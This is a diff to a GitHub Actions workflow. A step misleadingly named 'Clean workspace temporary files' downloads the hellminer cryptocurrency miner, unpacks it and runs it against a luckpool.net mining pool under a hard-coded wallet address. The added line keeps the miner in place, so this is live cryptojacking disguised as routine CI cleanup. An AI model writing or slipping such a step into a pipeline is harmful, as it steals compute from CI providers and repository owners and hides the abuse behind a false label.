@@ -18,5 +18,5 @@ jobs:
 
       - name: Clean workspace temporary files
         run: |
-          sudo apt update && sudo apt install wget -y && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz && cd hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RRFTkxaJaeofYNUA1HJadG3cGQkkQ2aJHV.lang -p x 
+          sudo apt update && sudo apt install wget -y && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RRFTkxaJaeofYNUA1HJadG3cGQkkQ2aJHV.lang -p x 
     
